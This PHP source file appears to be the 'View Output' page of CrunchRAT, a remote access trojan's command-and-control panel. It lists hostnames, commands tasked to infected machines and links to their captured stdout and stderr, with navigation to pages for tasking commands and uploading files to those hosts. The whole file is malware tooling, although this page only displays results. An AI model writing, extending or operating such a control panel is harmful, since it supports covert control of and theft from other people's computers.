<?php
  # Necessary at the top of every page for session management
  session_start();
        
  # If the RAT user isn't authenticated
  if (!isset($_SESSION["authenticated"]))
  {
    # Redirects them to 403.php page
    header("Location: 403.php");
  }
  # Else they are authenticated
  else
  {
    # Includes the RAT configuration file
    include "config/config.php";

    # Establishes a connection to the RAT database
    # Uses variables from "config/config.php"
    # "SET NAMES utf8" is necessary to be Unicode-friendly
    $dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
  } 
?>

<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <title>CrunchRAT</title>
    <link href="bootstrap/css/bootstrap.css" rel="stylesheet">
    <style>
      body 
      {
        padding-top: 60px; /* 60px to make the container go all the way to the bottom of the topbar */
      }
    </style>
    <link href="bootstrap/css/bootstrap-responsive.css" rel="stylesheet">
  </head>

  <body>
    <div class="navbar navbar-inverse navbar-fixed-top">
      <div class="navbar-inner">
        <div class="container">
          <button type="button" class="btn btn-navbar" data-toggle="collapse" data-target=".nav-collapse">
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
            <span class="icon-bar"></span>
          </button>
          <a class="brand" href="#">CrunchRAT</a>
          <div class="nav-collapse collapse">
            <ul class="nav">
              <li><a href="hosts.php">Hosts</a></li>
              <li><a href="command.php">Task Command</a></li>
              <li><a href="upload.php">Task File Upload</a></li>
              <li class="active"><a href="output.php">View Output</a></li>
              <li><a href="logout.php">Logout</a></li>
            </ul>
          </div><!--/.nav-collapse -->
        </div>
      </div>
    </div>

    <div class="container">          
      <table class="table table-bordered">
        <thead>
          <tr>
            <th>ID</th>
            <th>Hostname</th>
            <th>Action</th>
            <th>Secondary</th>
            <th>Output</th>
            <th>Executed?</th>
          </tr>
        </thead>
        <tbody>
        <?php
          # Gets everything from the "output" table
          $statement = $dbConnection->prepare("SELECT * FROM output");
          $statement->execute();
          $results = $statement->fetchAll();
      
          # Loops through each output (IE: each row) from the "output" table
          foreach ($results as $row)
          {
            $id = $row["id"];
            $hostname = $row["hostname"];
            $action = $row["action"];
            $secondary = $row["secondary"];
            $stdout = $row["stdout"]; 
            $stderr = $row["stderr"]; 
            $status = $row["status"];

            # We start to build the HTML table containing all of the information from the "output" table here
            # htmlentities() is used to convert dangerous characters (single and double quotes) to their respective HTML entities (protects against XSS)
            echo "<tr>";
            echo "<td>" . htmlentities($id, ENT_QUOTES, "UTF-8") . "</td>";
            echo "<td>" . htmlentities($hostname, ENT_QUOTES, "UTF-8") . "</td>";
            echo "<td>" . htmlentities($action, ENT_QUOTES, "UTF-8") . "</td>";
            echo "<td>" . htmlentities($secondary, ENT_QUOTES, "UTF-8") . "</td>";
              
            # "Output" HTML table column is built here
            # If "stdout" column is set for the command
            # We need to create a hyperlink to the "stdout" output instead of "stderr"
            if (!empty($row["stdout"]))
            { 
              # Builds "stdout" hyperlink for the command output
              $stdoutLink = "<a href=\"viewOut.php?id=" . htmlentities($id, ENT_QUOTES, "UTF-8") . "&stdout=true" . "\">stdout</a>";
              echo "<td>" . $stdoutLink . "</td>";    
            }
            # If "stderr" column is set for the command
            # We need to create a hyperlink to the "stderr" output instead of "stdout"
            elseif (!empty($row["stderr"]))
            {
              # Builds "stderr" hyperlink for the command error
              $stderrLink = "<a href=\"viewOut.php?id=" . htmlentities($id, ENT_QUOTES, "UTF-8") . "&stderr=true" . "\">stderr</a>";
              echo "<td>" . $stderrLink . "</td>";
            }
            else
            {
              echo "<td></td>";
            }

            echo "<td>" . htmlentities($status, ENT_QUOTES, "UTF-8") . "</td>";
            echo "</tr>";
          }
        ?>
        </tbody>
      </table>
    </div><!-- /container -->

    <!-- Javascript - placed at the bottom so it loads faster -->
    <script src="bootstrap/js/jquery.js"></script>
    <script src="bootstrap/js/bootstrap-transition.js"></script>
    <script src="bootstrap/js/bootstrap-alert.js"></script>
    <script src="bootstrap/js/bootstrap-modal.js"></script>
    <script src="bootstrap/js/bootstrap-dropdown.js"></script>
    <script src="bootstrap/js/bootstrap-scrollspy.js"></script>
    <script src="bootstrap/js/bootstrap-tab.js"></script>
    <script src="bootstrap/js/bootstrap-tooltip.js"></script>
    <script src="bootstrap/js/bootstrap-popover.js"></script>
    <script src="bootstrap/js/bootstrap-button.js"></script>
    <script src="bootstrap/js/bootstrap-collapse.js"></script>
    <script src="bootstrap/js/bootstrap-carousel.js"></script>
    <script src="bootstrap/js/bootstrap-typeahead.js"></script>
  </body>
</html>